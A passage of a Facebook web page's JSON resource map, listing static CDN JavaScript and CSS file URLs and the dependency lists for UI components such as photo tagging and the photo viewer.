                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yI\/l\/0,cross\/0JGAr6oe4eO.css?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "QQ8F2MA": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iqES4\/yd\/l\/en_US\/bDUe24MQR7z.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "pTiq2PW": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ya\/r\/XVhgZZtz7_x.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "qu5W65u": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y4\/r\/yW-_krZRMR6.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "a2YBUdi": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yz\/r\/E8iUwfMbYYs.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "l0NE8Iw": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y7\/r\/IMhW-LO0bz2.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "GkJxE+8": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yJ\/r\/UxXtqyjG9Xr.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "D97fKEa": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yE\/r\/FsDrC6LvjOx.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "dww39Pm": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i_6i4\/y2\/l\/en_US\/NhL9AX2c3tW.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "BC8rXF3": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ij8_4\/y6\/l\/en_US\/Vu6JjKFvYZ8.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "jDByXWY": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yh\/r\/HrYtpwoURq4.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "E8Hy2Pc": {
                        "type": "css",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yj\/l\/0,cross\/4ueh7F2bx9x.css?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "abWGOpI": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iejp4\/yY\/l\/en_US\/kg7hg88rRvL.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "PAVzyjJ": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ikPw4\/yf\/l\/en_US\/SKLeoP_kzTQ.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "AI5R1m1": {
                        "type": "css",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yt\/l\/0,cross\/xOmM6mcmDFC.css?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "DCGHDqp": {
                        "type": "css",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yL\/l\/0,cross\/bbabl9i6ugE.css?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "lGcuWFY": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iTQy4\/y7\/l\/en_US\/l4gj2kr_zAz.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "aIBG+Oh": {
                        "type": "css",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yh\/l\/0,cross\/3GsPwYNgpJX.css?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "mtchIYY": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ilF74\/yH\/l\/en_US\/dpdH79gvxi7.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "kxMPtsn": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yg\/r\/elen5sSnLyG.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "KeVPnA1": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y3\/r\/kOVhfYRp5Oi.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "nf73y6G": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ixFY4\/yk\/l\/en_US\/2bkwu1JYGPw.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "LgMd2Au": {
                        "type": "css",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yZ\/l\/0,cross\/uN5FW214PyA.css?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "UWb2FGB": {
                        "type": "css",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yz\/l\/0,cross\/DjdKt8rD9DP.css?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "8PkfUmd": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i4lr4\/yG\/l\/en_US\/GuT3uwMac6a.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "TBDk0Kt": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yj\/r\/4BX1e-1lumw.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "oJnNL9m": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i2VU4\/ya\/l\/en_US\/OhfAL1NS_gp.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "AmWszAw": {
                        "type": "css",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yA\/l\/0,cross\/ZGzN-28MSGJ.css?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "OrjqgXG": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yT\/r\/d84SYcNwD42.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "qwxGDDh": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iq2O4\/yW\/l\/en_US\/96LzGuAoW-K.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "NpqTjWI": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3imhK4\/yX\/l\/en_US\/4-qllgom0se.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "KSC887n": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ihVk4\/y_\/l\/en_US\/3_NvHjvtMGn.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "fjidrTE": {
                        "type": "css",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yl\/l\/0,cross\/HTTDcTyf0Ez.css?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "qsyg9aj": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yQ\/r\/NKDIAw0CaXn.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "PCuY7HX": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yH\/r\/IbQ6wII_r7x.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "Vbku8Z0": {
                        "type": "css",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yZ\/l\/0,cross\/xEBl_e4iaMP.css?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "trB5VRm": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yS\/r\/v7HwWlEtUbP.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "5xEP3p4": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iVqg4\/yV\/l\/en_US\/Apy3wGmIagN.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "009lm\/u": {
                        "type": "css",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yi\/l\/0,cross\/9VAJNOrRzWL.css?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "dm9tdl+": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iuWr4\/yx\/l\/en_US\/WKF74TSbSju.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "MVb6Eqh": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iAgG4\/y4\/l\/en_US\/O7GK9RNlGQN.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "hznhFNa": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y5\/r\/slvEixQI281.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "2ibOT2I": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iTbp4\/yl\/l\/en_US\/KClgWMYmWVT.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "3iqJyp9": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ym\/r\/oxo90LW3SZ4.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "syv98Vp": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yx\/r\/FaY_hFetN7t.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "SWtYkYw": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yP\/r\/qOMwbFms8O1.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "WLO28Oi": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yn\/r\/RGMfW0_HTRt.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "7ei8Cch": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y7\/r\/fa5xb0bQZAJ.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "BO4l1lY": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i8594\/yC\/l\/en_US\/-ZfJUrVoKIM.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "xcdI0h0": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i_IA4\/yK\/l\/en_US\/6sfS8Q2OQ8Q.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "jQscP+y": {
                        "type": "css",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ya\/l\/0,cross\/ESSWuZ2K0fA.css?_nc_x=Ij3Wp8lg5Kz",
                        "nonblocking": 1
                    },
                    "P\/AHfvj": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iLl54\/y-\/l\/en_US\/heltECv-O_u.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "XCLwaXB": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yf\/r\/dv9xTpSXVtd.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "5oyRvYY": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yY\/r\/qmeuXVdJQFi.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "LT3CYaZ": {
                        "type": "css",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yB\/l\/0,cross\/Hf3QrxwXTx2.css?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "QU4AEQU": {
                        "type": "css",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y_\/l\/0,cross\/_4X-1nSSGcl.css?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "eCXVPl6": {
                        "type": "css",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y-\/l\/0,cross\/SFXoknGUzUq.css?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "xnysXB\/": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i6Cp4\/yp\/l\/en_US\/IKKLtKtE8CC.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "547HYMp": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i5k-4\/yq\/l\/en_US\/7xOPKuUhALC.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "nSK+lhP": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3il0l4\/yK\/l\/en_US\/d3e2GWse6Ig.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "xC5uYSO": {
                        "type": "css",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y7\/l\/0,cross\/VzEL5Noo_ZS.css?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "VYAJWL5": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i1MJ4\/yV\/l\/en_US\/ZNyjWk56tyH.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "1wf6lws": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ixx34\/ys\/l\/en_US\/t3cJSFquvqZ.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "Bt8CUBz": {
                        "type": "css",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y7\/l\/0,cross\/bP5xA-tASG_.css?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "CN2jGnd": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i89Q4\/yd\/l\/en_US\/XXKeamGre1R.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "w1TY1Lz": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y8\/r\/GdhUgNAqG-H.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "8PyYKmn": {
                        "type": "css",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yk\/l\/0,cross\/YNKBdoJxo9L.css?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "zRID06a": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i_1h4\/ya\/l\/en_US\/HXTjLW5uGnf.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "f4p3vYU": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iARV4\/yn\/l\/en_US\/I8TIf1hMjEz.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "lTQV3IG": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y4\/r\/nuMCEGPII0G.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "PPjEP1\/": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y2\/r\/0dbyvqUsrhI.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "tSCgzZx": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ifOm4\/ye\/l\/en_US\/7IigsrhFHEG.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "\/J8Qktn": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iRKk4\/yh\/l\/en_US\/5Xi3NQO1CgX.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "UqhlYof": {
                        "type": "css",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y4\/l\/0,cross\/PhO774ebH8Q.css?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "i53JmID": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ys\/r\/LXk0eXgYpDd.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "vIPXKzX": {
                        "type": "css",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yB\/l\/0,cross\/IEMa9HaJEPM.css?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "HGDgPGf": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i4Wl4\/yq\/l\/en_US\/QVUoQSKCMfW.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "BXgKHQG": {
                        "type": "css",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yB\/l\/0,cross\/xIxN4R5tI3d.css?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "I+YjrlV": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iqOa4\/yI\/l\/en_US\/Uw_MG-jvkBE.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "\/WPzWj6": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i9X94\/yE\/l\/en_US\/-zxmSO6HlUo.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "w92kf1S": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y7\/r\/4PR8EXX-HwV.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "Tk4DaGt": {
                        "type": "css",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yL\/l\/0,cross\/8bzhdR8XNGz.css?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "ZiJ0ZNW": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iNX-4\/yq\/l\/en_US\/LzeTrjOQRN7.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "KyhrPmD": {
                        "type": "css",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yP\/l\/0,cross\/tCDS53lbCDb.css?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "2GzIU9S": {
                        "type": "css",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y3\/l\/0,cross\/C_EcBqrVynD.css?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "U7c\/+8u": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ibbF4\/yo\/l\/en_US\/WGtPHxh9ZSo.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "cA2n2cA": {
                        "type": "css",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yx\/l\/0,cross\/GiUqxTJnYge.css?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "bHm\/h++": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yz\/r\/3gO2yzSdOU4.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "azw31aa": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i_ER4\/yd\/l\/en_US\/towUJPH0Cpb.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "UGRsN\/F": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3irZX4\/y1\/l\/en_US\/x-A9Dl3LYva.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "GgRRCyp": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iDSI4\/yG\/l\/en_US\/ePMny_H1-mG.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "tkReMaK": {
                        "type": "css",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yE\/l\/0,cross\/hnQQINk9Of4.css?_nc_x=Ij3Wp8lg5Kz",
                        "nonblocking": 1
                    },
                    "hwtysmN": {
                        "type": "css",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yw\/l\/0,cross\/8gCeDzJjVra.css?_nc_x=Ij3Wp8lg5Kz",
                        "nonblocking": 1
                    },
                    "7a+5cLi": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yI\/r\/wnFQ3-DAvRO.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "zBxJWdC": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iSUg4\/y1\/l\/en_US\/xvIVGAlklYo.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "aD87j25": {
                        "type": "css",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yS\/l\/0,cross\/9lRmltPCvZ8.css?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "RbyjfYU": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iqgr4\/yu\/l\/en_US\/cyv7M7oHwEC.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "W+9jPib": {
                        "type": "css",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yN\/l\/0,cross\/Px7VklbI99K.css?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "K+ug04c": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yH\/r\/-1mTikBkwJE.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "gWMJgTe": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yH\/r\/iGksp69foR_.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "hIek+bG": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yY\/r\/DZ_VBlsy-dC.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "yepR3j\/": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iQht4\/yE\/l\/en_US\/jFCNDknf-PX.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "UpN0wOw": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iPjY4\/yc\/l\/en_US\/j5PJfDMRghm.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "8ELCBwH": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ye\/r\/VRzSVH5iU-V.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "xiSecOk": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yq\/r\/DmfDq-nz_sJ.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "oE4DofT": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yJ\/r\/EejAgnHUad4.js?_nc_x=Ij3Wp8lg5Kz"
                    }
                },
                "compMap": {
                    "Dock": {
                        "r": ["2mTEsTN", "kFwZFWQ", "jZNkHPB", "66LEdgI", "EF6XDLw", "ULMb96V", "3tF3AbD", "LwCHt1K", "QQ8F2MA", "pTiq2PW", "qu5W65u"],
                        "be": 1
                    },
                    "WebSpeedInteractionsTypedLogger": {
                        "r": ["2mTEsTN", "a2YBUdi", "l0NE8Iw", "GkJxE+8", "D97fKEa", "kFwZFWQ"],
                        "rds": {
                            "m": ["BanzaiScuba_DEPRECATED"]
                        },
                        "be": 1
                    },
                    "AsyncRequest": {
                        "r": ["2mTEsTN", "kFwZFWQ", "ULMb96V"],
                        "rds": {
                            "m": ["FbtLogging", "IntlQtEventFalcoEvent"],
                            "r": ["a2YBUdi"]
                        },
                        "be": 1
                    },
                    "DOM": {
                        "r": ["2mTEsTN", "ULMb96V"],
                        "be": 1
                    },
                    "Form": {
                        "r": ["2mTEsTN", "66LEdgI", "ULMb96V"],
                        "be": 1
                    },
                    "FormSubmit": {
                        "r": ["2mTEsTN", "kFwZFWQ", "66LEdgI", "dww39Pm", "ULMb96V"],
                        "rds": {
                            "m": ["FbtLogging", "IntlQtEventFalcoEvent", "BanzaiScuba_DEPRECATED"],
                            "r": ["a2YBUdi"]
                        },
                        "be": 1
                    },
                    "Input": {
                        "r": ["66LEdgI"],
                        "be": 1
                    },
                    "Live": {
                        "r": ["2mTEsTN", "kFwZFWQ", "QQ8F2MA", "BC8rXF3", "jDByXWY", "ULMb96V"],
                        "be": 1
                    },
                    "Toggler": {
                        "r": ["2mTEsTN", "kFwZFWQ", "jZNkHPB", "66LEdgI", "ULMb96V", "3tF3AbD", "LwCHt1K", "QQ8F2MA", "pTiq2PW"],
                        "be": 1
                    },
                    "Tooltip": {
                        "r": ["2mTEsTN", "kFwZFWQ", "jZNkHPB", "66LEdgI", "ULMb96V", "E8Hy2Pc"],
                        "rds": {
                            "m": ["FbtLogging", "IntlQtEventFalcoEvent", "PageTransitions", "BanzaiScuba_DEPRECATED", "Animation"],
                            "r": ["a2YBUdi", "qu5W65u"]
                        },
                        "be": 1
                    },
                    "URI": {
                        "r": [],
                        "be": 1
                    },
                    "trackReferrer": {
                        "r": [],
                        "rds": {
                            "m": ["BanzaiScuba_DEPRECATED"],
                            "r": ["2mTEsTN", "a2YBUdi", "kFwZFWQ"]
                        },
                        "be": 1
                    },
                    "PhotoTagApproval": {
                        "r": ["2mTEsTN", "abWGOpI", "PAVzyjJ", "ULMb96V"],
                        "be": 1
                    },
                    "PhotoSnowlift": {
                        "r": ["2mTEsTN", "kFwZFWQ", "66LEdgI", "QQ8F2MA", "qu5W65u", "E8Hy2Pc", "AI5R1m1", "jZNkHPB", "pTiq2PW", "ULMb96V", "DCGHDqp", "lGcuWFY", "abWGOpI", "aIBG+Oh", "mtchIYY", "l0NE8Iw", "kxMPtsn", "KeVPnA1", "nf73y6G", "3tF3AbD", "LwCHt1K", "LgMd2Au", "UWb2FGB", "8PkfUmd", "TBDk0Kt", "a2YBUdi", "oJnNL9m", "AmWszAw", "OrjqgXG", "qwxGDDh", "NpqTjWI", "KSC887n", "fjidrTE", "qsyg9aj", "PCuY7HX", "Vbku8Z0", "trB5VRm", "5xEP3p4", "009lm\/u", "dm9tdl+", "MVb6Eqh", "hznhFNa", "BC8rXF3", "GkJxE+8", "2ibOT2I", "3iqJyp9", "syv98Vp", "SWtYkYw", "WLO28Oi", "7ei8Cch", "EF6XDLw", "BO4l1lY", "xcdI0h0", "jQscP+y"],
                        "rds": {
                            "m": ["Animation", "VisualCompletionGating", "FbtLogging", "IntlQtEventFalcoEvent", "BanzaiScuba_DEPRECATED", "PageTransitions"]
                        },
                        "be": 1
                    },
                    "PhotoTagger": {
                        "r": ["mtchIYY", "2mTEsTN", "kFwZFWQ", "PAVzyjJ", "jZNkHPB", "ULMb96V", "aIBG+Oh", "pTiq2PW", "66LEdgI", "E8Hy2Pc", "AI5R1m1", "qu5W65u", "P\/AHfvj", "AmWszAw", "XCLwaXB", "5oyRvYY", "3tF3AbD", "LT3CYaZ", "QU4AEQU", "eCXVPl6", "abWGOpI", "QQ8F2MA", "a2YBUdi", "qsyg9aj", "xnysXB\/", "547HYMp", "l0NE8Iw", "nSK+lhP", "GkJxE+8", "xcdI0h0", "8PkfUmd", "xC5uYSO", "VYAJWL5", "BO4l1lY", "dm9tdl+", "2ibOT2I", "hznhFNa", "1wf6lws", "LgMd2Au", "Bt8CUBz", "MVb6Eqh", "NpqTjWI", "kxMPtsn", "nf73y6G", "BC8rXF3", "3iqJyp9", "syv98Vp", "SWtYkYw", "WLO28Oi", "7ei8Cch", "EF6XDLw", "CN2jGnd", "w1TY1Lz", "LwCHt1K", "8PyYKmn", "009lm\/u", "zRID06a", "f4p3vYU", "DCGHDqp", "lGcuWFY", "oJnNL9m", "lTQV3IG", "PPjEP1\/", "TBDk0Kt", "UWb2FGB", "tSCgzZx", "\/J8Qktn", "UqhlYof", "i53JmID", "vIPXKzX", "HGDgPGf", "KSC887n", "fjidrTE", "BXgKHQG", "I+YjrlV", "\/WPzWj6", "w92kf1S", "Tk4DaGt", "ZiJ0ZNW", "KyhrPmD", "2GzIU9S", "U7c\/+8u"],
                        "rdfds": {
                            "m": ["GamesVideoModerationRulesNux.react", "GamesVideoDeleteCommentDialog.react", "GamesVideoCommentRemovedDialog.react"],
                            "r": ["cA2n2cA", "bHm\/h++", "azw31aa", "UGRsN\/F", "GgRRCyp", "tkReMaK", "hwtysmN", "7a+5cLi"]
                        },
                        "rds": {
                            "m": ["PresenceStatus", "FbtLogging", "IntlQtEventFalcoEvent", "BanzaiScuba_DEPRECATED", "Animation", "PageTransitions", "LynxAsyncCallbackFalcoEvent", "CometSuspenseFalcoEvent"],
                            "r": ["zBxJWdC"]
                        },
                        "be": 1
                    },
                    "PhotoTags": {
                        "r": ["2mTEsTN", "abWGOpI", "jZNkHPB", "PAVzyjJ", "ULMb96V"],
                        "be": 1
                    },
                    "TagTokenizer": {
